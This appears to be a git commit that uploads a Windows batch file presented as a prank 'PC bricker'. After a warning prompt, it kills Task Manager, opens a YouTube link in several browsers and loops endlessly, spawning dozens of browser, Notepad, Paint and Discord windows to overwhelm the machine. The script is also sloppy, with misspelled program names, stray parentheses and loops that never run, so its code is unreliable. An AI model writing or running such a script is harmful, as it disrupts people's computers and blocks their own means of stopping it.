c3cc0d82a61128180197b977bb84834143ffef82
hahaip-sys <lola.ryder445@gmail.com>
2026-04-15 19:18:38 -0600

    Add files via upload

---
+++ DO NOT USE IN ANY TIME AT ALL.bat
@@ -0,0 +1,61 @@
+@echo off
+:Start
+echo warning this could brick your pc this is your last warning!.
+echo Choose an option:
+echo 1. yes
+echo 2. no
+set /p choice=Enter your choice: 
+
+if %choice%==1 goto good luck.
+if %choice%==2 exit
+
+:good luck.
+echo your computer will now be bricked you have 1 minute to use your computer.
+)
+:start
+Taskkill /IM Taskmgr.exe
+start cmd /k echo HAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAH
+start notepad
+start calc
+)
+start firFox "https://www.youtube.com/watch?v=gukF24s15fw"
+start chrome "https://www.youtube.com/watch?v=gukF24s15fw"
+start Msedge "https://www.youtube.com/watch?v=gukF24s15fw"
+start opra "https://www.youtube.com/watch?v=gukF24s15fw"
+start opragx "https://www.youtube.com/watch?v=gukF24s15fw"
+)
+start paint
+)
+start Taskmgr
+)
+start notepad
+)
+for /L %%i in (1,1,10) do (
+    start "" chrome.exe
+)
+for /L %%i in (1,60,10) do (
+    start "" firefox.exe
+)
+for /L %%i in (60,1,10) do (
+    start "" msedge.exe
+)
+for /L %%i in (60,60,10) do (
+    start "" opera.exe
+)
+for /L %%i in (120,60,10) do (
+    start "" brave.exe
+)
+for /L %%i in (120,120,10) do (
+    start "" notepad.exe
+)
+for /L %%i in (120,180,10) do (
+    start "" discord.exe
+)
+for /L %%i in (1,1,100) do (
+    start "" notepad.exe
+)
+for /L %%i in (1,1,100) do (
+    start "" paint.exe
+)
+goto start
+)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))
